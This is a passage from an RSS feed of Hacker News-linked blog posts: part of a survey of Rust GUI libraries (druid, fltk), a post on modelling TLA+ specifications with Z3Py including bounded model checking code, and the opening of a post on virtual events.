i have literally used this library before - on two different projects - and i'm at a loss.
i don't want to just copy and paste the examples without actually understanding what's going on, i can't understand what's going on in the examples, and there's nowhere else to get started.
so there goes that i guess.</p>
<h2>core-foundation</h2>
<blockquote>
<p>Bindings to Core Foundation for macOS.</p>
</blockquote>
<p>oh hey, it's an OS i don't have access to at all.
next.</p>
<h2>druid</h2>
<p>our next contender is <a href="https://linebender.org/druid/">druid</a>:</p>
<blockquote>
<p>Druid is a framework for building simple graphical applications.</p>
</blockquote>
<p>apparently this sprung out of that vi-like text editor a couple googlers were working on, so apparently it's at least possible to use it for real software.
there's a tutorial, they're on crates.io, they're describing it as "conceptually simple and largely non-magical" which i am always a fan of, i am cautiously optimistic.
if we throw it in our dependencies and just see if anything breaks, we find the surprising result that everything just works.</p>
<p>oh hey the first real chapter in the tutorial starts with</p>
<blockquote>
<p>this is outdated, and should be replaced with a walkthrough of getting a simple app built and running.</p>
</blockquote>
<p>you love to see it.
fortunately, we can just ignore that and skip to the hello world example, reproduced here in its entirety:</p>
<div><pre><span></span><span>use</span><span> </span><span>druid</span>::<span>{</span><span>AppLauncher</span><span>,</span><span> </span><span>WindowDesc</span><span>,</span><span> </span><span>Widget</span><span>,</span><span> </span><span>PlatformError</span><span>};</span><span></span>
<span>use</span><span> </span><span>druid</span>::<span>widget</span>::<span>Label</span><span>;</span><span></span>

<span>fn</span> <span>build_ui</span><span>()</span><span> </span>-&gt; <span>impl</span><span> </span><span>Widget</span><span>&lt;</span><span>()</span><span>&gt;</span><span> </span><span>{</span><span></span>
<span>    </span><span>Label</span>::<span>new</span><span>(</span><span>"Hello world"</span><span>)</span><span></span>
<span>}</span><span></span>

<span>fn</span> <span>main</span><span>()</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>(),</span><span> </span><span>PlatformError</span><span>&gt;</span><span> </span><span>{</span><span></span>
<span>    </span><span>AppLauncher</span>::<span>with_window</span><span>(</span><span>WindowDesc</span>::<span>new</span><span>(</span><span>build_ui</span><span>)).</span><span>launch</span><span>(())</span><span>?</span><span>;</span><span></span>
<span>    </span><span>Ok</span><span>(())</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>and somehow, this actually works.</p>
<p>the tutorial ends here, which is unfortunate, but there's more documentation, including explanations of core concepts with examples that are... todo lists!
with even more features than what i was planning to include here!
so that's convenient.
the UI hierarchy is based on CSS Flexbox, which i also appreciate.
this is what peak UI layout API looks like:</p>
<div><pre><span></span><span>fn</span> <span>build_new_todo</span><span>()</span><span> </span>-&gt; <span>impl</span><span> </span><span>Widget</span><span>&lt;</span><span>TodoState</span><span>&gt;</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>textbox</span><span> </span><span>=</span><span> </span><span>TextBox</span>::<span>new</span><span>()</span><span></span>
<span>        </span><span>.</span><span>with_placeholder</span><span>(</span><span>"New todo"</span><span>)</span><span></span>
<span>        </span><span>.</span><span>lens</span><span>(</span><span>TodoState</span>::<span>next_todo</span><span>);</span><span></span>
<span>    </span><span>let</span><span> </span><span>button</span><span> </span><span>=</span><span> </span><span>Button</span>::<span>new</span><span>(</span><span>"Add"</span><span>)</span><span></span>
<span>        </span><span>.</span><span>on_click</span><span>(</span><span>|</span><span>_</span><span>,</span><span> </span><span>data</span>: <span>&amp;</span><span>mut</span><span> </span><span>TodoState</span><span>,</span><span> </span><span>_</span><span>|</span><span> </span><span>data</span><span>.</span><span>create_todo</span><span>());</span><span></span>

<span>    </span><span>Flex</span>::<span>row</span><span>()</span><span></span>
<span>        </span><span>.</span><span>with_flex_child</span><span>(</span><span>textbox</span><span>.</span><span>expand_width</span><span>(),</span><span> </span><span>1.0</span><span>)</span><span></span>
<span>        </span><span>.</span><span>with_child</span><span>(</span><span>button</span><span>)</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>1 hour and 80 lines of code later, we've got ourselves a perfectly valid and working todo list!</p>
<p><img src="https://www.boringcactus.com/assets/2020-08-21-survey-of-rust-gui-libraries-1.png" alt="our sample druid application, showing a todo list"></p>
<p>i'm not quite happy with this, though: we can type text and hit the button and it adds the todo, but pressing enter in the text field doesn't do anything.
there's no way out-of-the-box to make that happen; let's see if we can build that ourselves.</p>
<p>~30 lines of code later, we've got it!
the <code>Controller</code> trait is designed for exactly this sort of thing, when you need to wrap the behavior of an existing component and intercept some events to inject your own logic.</p>
<p>if you're curious, you can take a look at <a href="https://git.sr.ht/~boringcactus/survey-of-rust-gui-libraries/tree/main/druid-test">the source for our druid example</a>.</p>
<p>so apparently druid is actually pretty darn usable.
i only have a couple tiny issues with it:</p>
<ol>
<li>it doesn't use platform native UI widgets, so it doesn't look quite like a windows app should, and it won't look quite like a mac or linux app should either if i test it there.
this one is a feature as far as some people are concerned, but i am not on that list.</li>
<li>accessibility features like being able to tab between UI widgets (<em>update 2020-12-14</em>: and also literally any screen reader support) are missing, so you'd have to roll those yourself in a real application.
 maybe they'll add that by default in future versions, maybe not, but it would be neat if it existed.</li>
<li>high-level documentation is incomplete.
the individual struct/function docs are really good, but at a high level you don't really have a convenient place to jump in.</li>
</ol>
<p>i was about to add "no support for web" to that list, but even though the high-level docs don't mention it, the crate root docs and the examples do.
on the plus side, it just works, and i didn't have to make any changes to my code because i use <a href="https://github.com/rustwasm/wasm-pack/pull/736">this patch to wasm-pack that lets you just use binary crates in wasm-pack</a> even though it hasn't been merged yet upstream.
on the minus side, it points everything at a <code>&lt;canvas&gt;</code> tag, which means you get none of the accessibility features of actually using the DOM.
so that one's a mixed bag.</p>
<p>but yeah, overall druid is perfectly usable for gui development.
i was originally calling this post "we are not gui yet" but i guess we are at least a little bit gui already.
pleasant surprises are the best kind.</p>
<h2>fltk</h2>
<p>following up that success is <a href="https://github.com/MoAlyousef/fltk-rs">fltk</a>:</p>
<blockquote>
<p>The FLTK crate is a crossplatform lightweight gui library which can be statically linked to produce small, self-contained and fast gui applications.</p>
</blockquote>
<p>cross-platform and statically linked are both good things.
the upstream FLTK website makes my eyes bleed, which is never a good sign for a UI library, but that doesn't mean much one way or the other.
the simple hello world example is once again a mere handful of lines:</p>
<div><pre><span></span><span>use</span><span> </span><span>fltk</span>::<span>{</span><span>app</span>::<span>*</span><span>,</span><span> </span><span>window</span>::<span>*</span><span>};</span><span></span>

<span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>app</span><span> </span><span>=</span><span> </span><span>App</span>::<span>default</span><span>();</span><span></span>
<span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>wind</span><span> </span><span>=</span><span> </span><span>Window</span>::<span>new</span><span>(</span><span>100</span><span>,</span><span> </span><span>100</span><span>,</span><span> </span><span>400</span><span>,</span><span> </span><span>3â€¦</span></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.boringcactus.com/2020/08/21/survey-of-rust-gui-libraries.html">https://www.boringcactus.com/2020/08/21/survey-of-rust-gui-libraries.html</a></em></p>]]>
            </description>
            <link>https://www.boringcactus.com/2020/08/21/survey-of-rust-gui-libraries.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492179</guid>
            <pubDate>Mon, 21 Dec 2020 04:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modeling TLA+ in Z3Py]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25492150">thread link</a>) | @philzook
<br/>
December 20, 2020 | https://www.philipzucker.com/Modelling_TLA_in_z3py/ | <a href="https://web.archive.org/web/*/https://www.philipzucker.com/Modelling_TLA_in_z3py/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Itâ€™s that time of year again where Iâ€™m fiddling around with Z3Py. Iâ€™m booting it back up because Iâ€™m scheduled to do a <a href="https://fmie2021.github.io/agenda.html">tutorial on Z3</a> on Feb 3. Itâ€™s kind of silly because I probably already have too much content, and the tutorial is aimed at newbies, but there are some fun new things that Iâ€™ve learned in the last year I can do in Z3. As one example, itâ€™s not so hard to build a pretty reasonable simulacrum of TLA+ in Z3.</p>

<p><a href="https://lamport.azurewebsites.net/tla/tla.html">TLA+</a> is a modelling/specification language for computational processes. It is particularly useful for modeling concurrency, where our intuitions fail us <a href="http://deadlockempire.github.io/">http://deadlockempire.github.io/</a>. Itâ€™s the mind child of Leslie Lamport, the same guy behind <a href="https://en.wikipedia.org/wiki/LaTeX">LaTex</a> and <a href="https://en.wikipedia.org/wiki/Paxos_(computer_science)">Paxos</a>. The language doesnâ€™t aim for deep verification of your actual code as is sometimes the goal with tools like Coq, but because of that it is significantly more lightweight and easy to use. 
The <a href="https://lamport.azurewebsites.net/tla/toolbox.html">TLA+ Toolbox</a> is a freely available IDE and checker to TLA+, but I think it is kind of a neat idea to replicate something in the flavor of TLA+ in all too familiar python. By leveraging Z3, we can get a lot of logical mileage and solver power for free.</p>

<p><a href="https://rise4fun.com/z3/tutorial">Z3</a> is an SMT solver. Its input language <a href="http://smtlib.cs.uiowa.edu/examples.shtml">smtlib2</a> is a kind of typed first order logic with special support for things like booleans, integers, reals, bitvectors, and algebraic datatypes. You can ask Z3 if propositions are valid, or if not it can provide a counterexample. It works pretty crazy good, especially if you work around its weaknesses (mostly quantifiers and nasty nonlinear stuff). Z3 has top class performance and its <a href="https://z3prover.github.io/api/html/namespacez3py.html">python bindings</a> are widely regarded as very good.</p>

<p>The main unusual things TLA brings into play compared to bog standard logics is the primed variables \(x'\), representing the values of variables at the next time step, and some temporal operators like always \(\Box\) and eventually \(\Diamond\).</p>

<p>We could mark primes by creating variables in pairs</p>
<div><div><pre><code><span>from</span> <span>z3</span> <span>import</span> <span>*</span>
<span>x</span><span>,</span> <span>xnxt</span> <span>=</span> <span>Ints</span><span>(</span><span>"x x'"</span><span>)</span>
</code></pre></div></div>

<p>But Iâ€™ve chosen to mark the prime variables using a special uninterpreted function, which we strip out later.</p>

<div><div><pre><code><span>def</span> <span>nxt</span><span>(</span><span>x</span><span>):</span> <span># next is a special function for generators in python, so we shouldn't use that name
</span>    <span>assert</span> <span>is_const</span><span>(</span><span>x</span><span>)</span>
    <span>assert</span> <span>f</span><span>.</span><span>decl</span><span>().</span><span>kind</span><span>()</span> <span>==</span> <span>Z3_OP_UNINTERPRETED</span><span>:</span>
    <span>s</span> <span>=</span> <span>x</span><span>.</span><span>sort</span><span>()</span>
    <span>return</span> <span>Function</span><span>(</span><span>"nxt"</span><span>,</span> <span>s</span><span>,</span> <span>s</span><span>)(</span><span>x</span><span>)</span>
</code></pre></div></div>

<p>One breakage here as compared to with TLA+ is the use of types. TLA+ curiously insists on a lack of intrinsic types and argues against them as a foundational feature. Types are instead propositions that are proved in the system. This just is really not convenient for using with Z3, so from the get-go Iâ€™m going to take liberties.</p>

<p>We can implement an <code>always</code> operator via a fairly simple procedure, we just roll out the execution of any formula for <code>n</code> time steps. This is the trick of bounded model checking. This rollout can be achieved by using the Z3 <code>substitute</code> function, a surprisingly useful little fellow.</p>

<div><div><pre><code><span># collects up all the variable from a formula
# https://stackoverflow.com/questions/14080398/z3py-how-to-get-the-list-of-variables-from-a-formula
</span><span>def</span> <span>get_vars</span><span>(</span><span>f</span><span>):</span>
    <span>r</span> <span>=</span> <span>set</span><span>()</span>
    <span>def</span> <span>collect</span><span>(</span><span>f</span><span>):</span>
      <span>if</span> <span>is_const</span><span>(</span><span>f</span><span>):</span> 
          <span>if</span> <span>f</span><span>.</span><span>decl</span><span>().</span><span>kind</span><span>()</span> <span>==</span> <span>Z3_OP_UNINTERPRETED</span><span>:</span>
              <span>r</span><span>.</span><span>add</span><span>(</span><span>f</span><span>)</span>
      <span>else</span><span>:</span>
          <span>for</span> <span>c</span> <span>in</span> <span>f</span><span>.</span><span>children</span><span>():</span>
              <span>collect</span><span>(</span><span>c</span><span>)</span>
    <span>collect</span><span>(</span><span>f</span><span>)</span>
    <span>return</span> <span>r</span>


<span>#https://theory.stanford.edu/~nikolaj/programmingz3.html#sec-bounded-model-checking
# rolls out the transition relation for n steps
# it replaces x with x_i and prime(x) with x_(i+1)
</span><span>def</span> <span>always</span><span>(</span><span>p</span><span>,</span><span>n</span><span>=</span><span>20</span><span>):</span>
    <span>orig_vs</span> <span>=</span> <span>get_vars</span><span>(</span><span>p</span><span>)</span>
    <span>nextvs</span> <span>=</span> <span>orig_vs</span>
    <span>t</span> <span>=</span> <span>True</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span><span>n</span><span>):</span>
        <span>vs</span> <span>=</span> <span>nextvs</span>
        <span>nextvs</span> <span>=</span>  <span>[</span> <span>Const</span><span>(</span> <span>f"</span><span>{</span><span>str</span><span>(</span><span>v</span><span>)</span><span>}</span><span>_</span><span>{</span><span>i</span><span>}</span><span>"</span><span>,</span> <span>v</span><span>.</span><span>sort</span><span>())</span> <span>for</span> <span>v</span> <span>in</span> <span>orig_vs</span>  <span>]</span>
        <span>p1</span> <span>=</span> <span>substitute</span><span>(</span><span>p</span><span>,</span> <span>[</span> <span>(</span><span>nxt</span><span>(</span><span>v</span><span>),</span> <span>nextv</span><span>)</span> <span>for</span> <span>v</span><span>,</span> <span>nextv</span> <span>in</span> <span>zip</span><span>(</span><span>orig_vs</span><span>,</span><span>nextvs</span><span>)</span>  <span>])</span> 
        <span>p2</span> <span>=</span> <span>substitute</span><span>(</span><span>p1</span><span>,</span> <span>[</span> <span>(</span><span>orig_v</span><span>,</span> <span>v</span><span>)</span> <span>for</span> <span>orig_v</span><span>,</span> <span>v</span> <span>in</span> <span>zip</span><span>(</span><span>orig_vs</span><span>,</span><span>vs</span><span>)</span>  <span>])</span>
        <span>t</span> <span>=</span> <span>And</span><span>(</span><span>t</span><span>,</span><span>p2</span><span>)</span>
    <span>return</span> <span>t</span>
</code></pre></div></div>

<p>Here for example is the specification of a clock from the <a href="https://www.microsoft.com/en-us/research/uploads/prod/2018/05/book-02-08-08.pdf">Specifying Systems</a> book. The clock starts with an hour between 0 and 12, and at each time step increases unless itâ€™s wrapped around 12.</p>

<div><div><pre><code><span>hr</span> <span>=</span> <span>Int</span><span>(</span><span>"hr"</span><span>)</span>
<span>HCini</span> <span>=</span> <span>And</span><span>(</span><span>1</span> <span>&lt;=</span> <span>hr</span><span>,</span> <span>hr</span> <span>&lt;=</span> <span>12</span><span>)</span>
<span>HCnxt</span> <span>=</span> <span>nxt</span><span>(</span><span>hr</span><span>)</span> <span>==</span> <span>If</span><span>(</span><span>hr</span> <span>!=</span> <span>12</span><span>,</span> <span>hr</span> <span>+</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
<span>HC</span> <span>=</span> <span>And</span><span>(</span><span>HCini</span><span>,</span> <span>always</span><span>(</span><span>HCnxt</span><span>))</span> 
<span>prove</span><span>(</span><span>Implies</span><span>(</span><span>HC</span><span>,</span>  <span>always</span><span>(</span><span>HCini</span><span>)))</span> <span># prove clock always stays between 0 and 12 (for 20 times steps)
</span></code></pre></div></div>

<p>You do have to be careful with using always. Arbitrarily nesting itâ€™s usage may give unexpected results. Lamport makes an argument that specs very rarely do or should make sophisticated use of the temporal operators. Maybe this is good enough or maybe there is a way to patch this up.</p>

<p>Here are some other useful TLA+ like features and functions transcoded.</p>

<div><div><pre><code><span>def</span> <span>elem</span><span>(</span><span>x</span><span>,</span><span>S</span><span>):</span>
    <span>return</span> <span>Or</span><span>([</span><span>x</span> <span>==</span> <span>s</span> <span>for</span> <span>s</span> <span>in</span> <span>S</span><span>])</span>

<span>def</span> <span>unchanged</span><span>(</span><span>*</span><span>args</span><span>):</span>
    <span>return</span> <span>And</span><span>([</span><span>prime</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>x</span> <span>for</span> <span>x</span> <span>in</span> <span>args</span><span>])</span>

<span>def</span> <span>eventually</span><span>(</span><span>p</span><span>,</span> <span>n</span><span>=</span><span>20</span><span>):</span>
    <span>return</span> <span>Not</span><span>(</span><span>always</span><span>(</span><span>Not</span><span>(</span><span>p</span><span>),</span><span>n</span><span>=</span><span>n</span><span>))</span>

<span>def</span> <span>stutter</span><span>(</span><span>p</span><span>,</span> <span>vars</span><span>=</span><span>None</span><span>):</span>
    <span>if</span> <span>vars</span> <span>==</span> <span>None</span><span>:</span>
        <span>vars</span> <span>=</span> <span>get_vars</span><span>(</span><span>p</span><span>)</span>
    <span>return</span> <span>Or</span><span>(</span><span>p</span><span>,</span> <span>unchanged</span><span>(</span><span>*</span><span>vars</span><span>))</span>

<span>def</span> <span>enabled</span><span>(</span><span>A</span><span>):</span>
    <span>vs</span> <span>=</span> <span>get_vars</span><span>(</span><span>A</span><span>)</span>
    <span>nxtvs</span> <span>=</span>  <span>[</span> <span>FreshConst</span><span>(</span>  <span>v</span><span>.</span><span>sort</span><span>(),</span> <span>prefix</span><span>=</span><span>str</span><span>(</span><span>v</span><span>)</span> <span>)</span> <span>for</span> <span>v</span> <span>in</span> <span>vs</span><span>]</span>
    <span>p1</span> <span>=</span> <span>substitute</span><span>(</span><span>A</span><span>,</span> <span>[</span> <span>(</span><span>nxt</span><span>(</span><span>v</span><span>),</span> <span>nextv</span><span>)</span> <span>for</span> <span>v</span><span>,</span> <span>nextv</span> <span>in</span> <span>zip</span><span>(</span><span>vs</span><span>,</span><span>nxtvs</span><span>)</span>  <span>])</span> 
    <span>return</span> <span>Exists</span><span>(</span><span>nxtvs</span><span>,</span> <span>p1</span><span>)</span>

<span># backports useful logical operator notation for z3 that it does not have by default
</span><span>BoolRef</span><span>.</span><span>__and__</span> <span>=</span> <span>lambda</span> <span>self</span><span>,</span> <span>rhs</span><span>:</span> <span>And</span><span>(</span><span>self</span><span>,</span><span>rhs</span><span>)</span>
<span>BoolRef</span><span>.</span><span>__or__</span> <span>=</span> <span>lambda</span> <span>self</span><span>,</span> <span>rhs</span><span>:</span> <span>Or</span><span>(</span><span>self</span><span>,</span><span>rhs</span><span>)</span>
<span>BoolRef</span><span>.</span><span>__xor__</span> <span>=</span> <span>lambda</span> <span>self</span><span>,</span> <span>rhs</span><span>:</span> <span>Xor</span><span>(</span><span>self</span><span>,</span><span>rhs</span><span>)</span>
<span>BoolRef</span><span>.</span><span>__invert__</span> <span>=</span> <span>lambda</span> <span>self</span><span>:</span> <span>Not</span><span>(</span><span>self</span><span>)</span>
<span>BoolRef</span><span>.</span><span>__rshift__</span> <span>=</span> <span>lambda</span> <span>self</span><span>,</span> <span>rhs</span><span>:</span> <span>Implies</span><span>(</span><span>self</span><span>,</span><span>rhs</span><span>)</span>
</code></pre></div></div>

<p>Here as another example is the <a href="http://lamport.azurewebsites.net/video/video4.html">Die Hard puzzle</a></p>

<div><div><pre><code><span>small</span><span>,</span> <span>big</span> <span>=</span> <span>Ints</span><span>(</span><span>"small big"</span><span>)</span>

<span>TypeOk</span> <span>=</span> <span>And</span><span>(</span>
   <span>elem</span><span>(</span><span>small</span><span>,</span> <span>range</span><span>(</span><span>4</span><span>)),</span>
   <span>elem</span><span>(</span><span>big</span><span>,</span> <span>range</span><span>(</span><span>6</span><span>))</span>
<span>)</span>
<span>Init</span> <span>=</span> <span>And</span><span>(</span>
   <span>big</span> <span>==</span> <span>0</span><span>,</span>
   <span>small</span> <span>==</span> <span>0</span>
<span>)</span>

<span>FillSmall</span> <span>=</span> <span>And</span><span>(</span><span>prime</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>3</span><span>,</span> <span>unchanged</span><span>(</span><span>big</span><span>))</span>
<span>FillBig</span> <span>=</span> <span>And</span><span>(</span><span>prime</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>5</span><span>,</span> <span>unchanged</span><span>(</span><span>small</span><span>))</span>
<span>Goal</span> <span>=</span> <span>big</span> <span>!=</span> <span>4</span>
<span>SmallToBig</span> <span>=</span> <span>If</span><span>(</span><span>big</span> <span>+</span> <span>small</span> <span>&lt;=</span> <span>5</span><span>,</span>   
                 <span>And</span><span>(</span> <span>nxt</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>big</span> <span>+</span> <span>small</span><span>,</span> <span>nxt</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>0</span> <span>)</span> <span>,</span> 
                 <span>And</span><span>(</span><span>nxt</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>small</span> <span>-</span> <span>(</span><span>5</span> <span>-</span> <span>big</span><span>),</span> <span>nxt</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>5</span><span>)</span>
               <span>)</span>

<span>BigToSmall</span> <span>=</span> <span>If</span><span>(</span> <span>big</span> <span>+</span> <span>small</span> <span>&lt;=</span> <span>3</span><span>,</span>
                 <span>And</span><span>(</span> <span>nxt</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>big</span> <span>+</span> <span>small</span><span>,</span> <span>nxt</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>0</span><span>),</span>
                 <span>And</span><span>(</span> <span>nxt</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>3</span><span>,</span> <span>nxt</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>big</span> <span>-</span> <span>(</span><span>3</span> <span>-</span> <span>small</span><span>)</span> <span>)</span>
                <span>)</span>

<span>EmptyBig</span> <span>=</span> <span>And</span><span>(</span><span>nxt</span><span>(</span><span>big</span><span>)</span> <span>==</span> <span>0</span><span>,</span>  <span>unchanged</span><span>(</span><span>small</span><span>))</span> 
<span>EmptySmall</span> <span>=</span> <span>And</span><span>(</span><span>nxt</span><span>(</span><span>small</span><span>)</span> <span>==</span> <span>0</span><span>,</span>  <span>unchanged</span><span>(</span><span>big</span><span>))</span> 
<span>Next</span> <span>=</span> <span>Or</span><span>(</span><span>FillSmall</span><span>,</span> <span>FillBig</span><span>,</span> <span>EmptySmall</span><span>,</span> <span>EmptyBig</span><span>,</span> <span>SmallToBig</span><span>,</span> <span>BigToSmall</span><span>)</span>

<span>Spec</span> <span>=</span> <span>Init</span> <span>&amp;</span> <span>always</span><span>(</span><span>Next</span><span>,</span> <span>n</span><span>=</span><span>8</span><span>)</span>
<span>prove</span><span>(</span> <span>Implies</span><span>(</span><span>Spec</span>  <span>,</span> <span>always</span><span>(</span><span>Goal</span><span>,</span> <span>n</span> <span>=</span> <span>8</span><span>)))</span>
</code></pre></div></div>

<p>Z3 does in fact return a counter model that fills the buckets up as desired.</p>

<p>TLA+ has a tendency to use functions/records which are not so obvious how to encode. There are different ways of going about this. One aspect of playing around with Z3py is that it makes extremely clear the existence of the logic language and a metalanguage. The logic is Z3 expressions, but the metalanguage is python and they are obviously very different. But there is often a choice of whether to encode things in the logic vs the metalanguage. It is usually better I think to encode as much in python as possible if you can get away with it. Z3 likes piles of simple constraints more than it likes complicated quantifiers and things.</p>

<p>For example, we can want to encode an Enum type in python or in Z3.</p>

<div><div><pre><code><span>from</span> <span>enum</span> <span>import</span> <span>Enum</span><span>,</span> <span>auto</span>
<span>#python enum
</span><span>class</span> <span>RMState</span><span>(</span><span>Enum</span><span>):</span>
     <span>WORKING</span> <span>=</span> <span>auto</span><span>()</span>
     <span>PREPARED</span> <span>=</span> <span>auto</span><span>()</span>
     <span>COMMITTED</span> <span>=</span> <span>auto</span><span>()</span>
     <span>ABORTED</span> <span>=</span> <span>auto</span><span>()</span>

<span># z3 enum
</span><span>RMState</span> <span>=</span> <span>Datatype</span><span>(</span><span>"RMState"</span><span>)</span>
<span>RMState</span><span>.</span><span>declare</span><span>(</span><span>"working"</span><span>)</span>
<span>RMState</span><span>.</span><span>declare</span><span>(</span><span>"prepared"</span><span>)</span>
<span>RMState</span><span>.</span><span>declare</span><span>(</span><span>"committed"</span><span>)</span>
<span>RMState</span><span>.</span><span>declare</span><span>(</span><span>"aborted"</span><span>)</span>
<span>RMState</span> <span>=</span> <span>RMState</span><span>.</span><span>create</span><span>()</span>
</code></pre></div></div>

<p>Or we can choose to encode records in Z3 vs python.</p>

<div><div><pre><code><span>#python record of z3 values
</span><span>val</span> <span>=</span> <span>Int</span><span>(</span><span>"val"</span><span>)</span>
<span>rdy</span><span>,</span> <span>ack</span> <span>=</span> <span>Bools</span><span>(</span><span>"rdy ack"</span><span>)</span>
<span>chan</span> <span>=</span> <span>{</span><span>val</span> <span>:</span> <span>val</span><span>,</span> <span>rdy</span> <span>:</span> <span>rdy</span><span>,</span> <span>ack</span> <span>:</span> <span>ack</span><span>}</span>

<span># Z3 record of Z3 values
</span><span>Chan</span> <span>=</span> <span>Datatype</span><span>(</span><span>"Chan"</span><span>)</span>
<span>ChanCon</span> <span>=</span> <span>Chan</span><span>.</span><span>declare</span><span>(</span><span>"constr"</span><span>,</span> <span>(</span><span>"val"</span><span>,</span> <span>IntSort</span><span>())</span> <span>,</span> <span>(</span><span>"rdy"</span><span>,</span> <span>BoolSort</span><span>()),</span>  <span>(</span><span>"ack"</span><span>,</span> <span>BoolSort</span><span>())</span> <span>)</span>
<span>Chan</span> <span>=</span> <span>Chan</span><span>.</span><span>create</span><span>()</span>
<span>record</span> <span>=</span> <span>Chan</span><span>.</span><span>constr</span><span>(</span><span>val</span><span>,</span><span>rdy</span><span>,</span><span>ack</span><span>)</span>
<span>chan</span> <span>=</span> <span>Const</span><span>(</span><span>"chan"</span><span>,</span> <span>Chan</span><span>)</span>
</code></pre></div></div>

<p>Or we can choose to encode functions in z3 or python</p>

<div><div><pre><code><span># python square. Works of Z3 values too
</span><span>def</span> <span>square</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>x</span><span>*</span><span>x</span>

<span># Internalized Z3 square function
</span><span>square</span> <span>=</span> <span>Function</span><span>(</span><span>"square"</span><span>,</span> <span>IntSort</span><span>(),</span><span>IntSort</span><span>())</span>
<span>x</span> <span>=</span> <span>Int</span><span>(</span><span>"x"</span><span>)</span>
<span>square_axiom</span> <span>=</span> <span>ForAll</span><span>([</span><span>x</span><span>],</span> <span>square</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>x</span> <span>*</span> <span>x</span><span>)</span>
</code></pre></div></div>

<h3 id="bits-and-bobbles">Bits and Bobbles</h3>

<p>Downsides:</p>

<ul>
  <li>Very ad hoc. The use of special autogenerated names is a great way to inadvertently smash things together</li>
  <li>TLA syntax is designed to be readable. The python adds a lot of noise</li>
  <li>TLA toolbox can format specs nicely using latex.</li>
  <li>TLA has a lot of thought gone into it. Making changes to it in an afternoon of thought is probably not to be trusted</li>
</ul>

<p>Upsides:</p>
<ul>
  <li>Better fits Z3, so we get good automation from the get go</li>
  <li>python is lingua franca of computing. It is comforting compared to TLA+, even if Z3py might be discomfiting.</li>
  <li>Having to download the toolbox and figure out how to use it is always going to be a slight speedbump. There is a TLA+ vscode extension now though. That might help</li>
</ul>

<p>Using Python ast parsing <a href="https://greentreesnakes.readthedocs.io/en/latest/index.html">https://greentreesnakes.readthedocs.io/en/latest/index.html</a>, we could probably use regular simple python syntax as a PlusCal like DSL and compile it into the above Z3-TLA+ hybrid.</p>

<p>Iâ€™m not sure if the CHOOSE operator of TLA+ will be easy to implement. It kind of seems like it requires nested solves? Can it be encoded using</p>

<p>I donâ€™t particularly understand the TLA+ module system yet and Iâ€™m not so sure how to emulate it. Python modules might be one way, or perhaps classes.</p>

<p>Although I tried to copy exactly, perhaps one shouldnâ€™t spec in precisely the style of standard TLA+.</p>

<h3 id="links">Links</h3>

<ul>
  <li><a href="https://www.learntla.com/introduction/">https://www.learntla.com/introduction/</a> Hillel Wayneâ€™s tutorial</li>
  <li><a href="https://www.microsoft.com/en-us/research/uploads/prod/2018/05/book-02-08-08.pdf">https://www.microsoft.com/en-us/research/uploads/prod/2018/05/book-02-08-08.pdf</a> Specifying Systems</li>
  <li><a href="https://pron.github.io/tlaplus">https://pron.github.io/tlaplus</a>  Very impressive essays by Ron Pressler</li>
  <li><a href="https://github.com/cobusve/TLAPLUS_DeadlockEmpire">https://github.com/cobusve/TLAPLUS_DeadlockEmpire</a> Very neat way to learn TLA+</li>
  <li><a href="https://github.com/tlaplus/Examples">https://github.com/tlaplus/Examples</a></li>
  <li>Apalache is a Z3 backed model checker for TLA+ <a href="https://github.com/informalsystems/apalache">https://github.com/informalsyâ€¦</a></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.philipzucker.com/Modelling_TLA_in_z3py/">https://www.philipzucker.com/Modelling_TLA_in_z3py/</a></em></p>]]>
            </description>
            <link>https://www.philipzucker.com/Modelling_TLA_in_z3py/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492150</guid>
            <pubDate>Mon, 21 Dec 2020 04:31:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtual Events Suck]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25491847">thread link</a>) | @gmays
<br/>
December 20, 2020 | https://aparker.io/posts/virtual-events-suck/ | <a href="https://web.archive.org/web/*/https://aparker.io/posts/virtual-events-suck/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
  
  <p><time datetime="2020-12-10T09:30:00-0500">Thu, Dec 10, 2020</time></p><p><img src="https://aparker.io/images/virtualeventssuckheader.png" alt="image"></p>
<p>I mean, is this even up for argument?</p>

